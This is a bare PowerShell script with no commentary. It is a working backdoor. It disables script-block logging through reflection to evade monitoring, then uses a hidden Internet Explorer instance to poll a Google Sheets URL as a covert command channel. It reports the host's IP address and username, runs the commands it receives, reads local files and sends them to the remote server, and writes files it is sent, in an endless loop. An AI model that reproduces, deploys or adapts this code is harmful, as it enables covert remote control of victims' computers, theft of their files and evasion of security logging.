iex('$gp=[ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static");if($gp){$gpc=$gp.GetValue($null);if($gpc["ScriptBlockLogging"]){$gpc["ScriptBlockLogging"]["EnableScriptBlockLogging"]=0;$gpc["ScriptBlockLogging"]["EnableScriptBlockInvocationLogging"]=0;}$val=[System.Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add("EnableScriptBlockLogging",0);$val.Add("EnableScriptBlockInvocationLogging",0);$gpc["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"]=$val;}');
$CHUNK = 50000;
$SRV = "https://docs.google.com/spreadsheets/d/1OoUNxbLtZ2sklvwN2qgM3pdh6Rk6708f9ruHzi8QpQ0/edit";

function get {
  param($ie, $k, $d);
  $x = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($d));
  $ie.navigate2($SRV + "?$k=" + $x, 14, 0, $null, $null);
  while ($ie.busy -or ($ie.readystate -ne 4)) {
    sleep -seconds 1;
  };
  return $ie.document.lastchild.innertext;
}

function post {
  param($ie, $k, $d, $p);
  $x = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($d));
  $ie.navigate2($SRV + "?$k=" + $x, 14, 0, [Text.Encoding]::UTF8.GetBytes("d=$p"), $null);
  while ($ie.busy -or ($ie.readystate -ne 4)) {
    sleep -seconds 1;
  };
}

function _iex {
  param($private:x);
  try {
    return iex $private:x;
  } catch {
    return $_;
  }
}

while (1) {
  try {
    $ie = new-object -com internetexplorer.application;
    $ie.visible = $false;
    $ie.silent = $true;
    $ip = get-wmiobject Win32_NetworkAdapterConfiguration | where {$_.Ipaddress.length -gt 1};
    $s = $ip.ipaddress[0] + '|' + $env:USERNAME;
    while (1) {
      $b = new-object Collections.ArrayList;
      while (1) {
        while (1) {
          $tp = get $ie 'TxR' $s;
          if ($tp -ne '0') {
            break;
          }
        }
        $d = get $ie 'TxD' ($s + '|4');
        $b.add($d) | out-null;
        post $ie 'Tx' ($s + '|3') '0';
        if ($tp -ne '2') {
          break;
        }
      }
      if ($tp -eq '1') {
        $x = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b -join ''));
        $r = _iex($x);
        if ($r -eq $null) {
          $r = 'NULL';
        } else {
          $r = $r | out-string;
        }
        $r = $r.ToCharArray();
      } elseif ($tp -eq '3') {
        $r = [IO.file]::ReadAllBytes([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b -join '')));
      } else {
        [IO.file]::WriteAllBytes("$tp", [Convert]::FromBase64String($b -join ''));
        $r = 'NULL'.ToCharArray();
      }
      $i = 0;
      $rx = [Convert]::ToBase64String($r);
      while ($i -le ($rx.length - $CHUNK)) {
        $c = $rx[$i..($i + $CHUNK - 1)] -join '';
        post $ie 'Rx' ($s + '|4') $c;
        post $ie 'Rx' ($s + '|3') '2';
        $i += $CHUNK;
        while (1) {
          $tp = get $ie 'RxR' $s;
          if ($tp -eq '0') {
            break;
          }
        }
      }
      $c = $rx[$i..($rx.length + $CHUNK - 1)] -join '';
      post $ie 'Rx' ($s + '|4') $c;
      post $ie 'Rx' ($s + '|3') '1';
      $d = Get-Random -InputObject 1, 2, 3;
      sleep -seconds $d;
      $ie.stop();
    }
  } catch {
    taskkill.exe /f /im iexplore.exe;
  }
}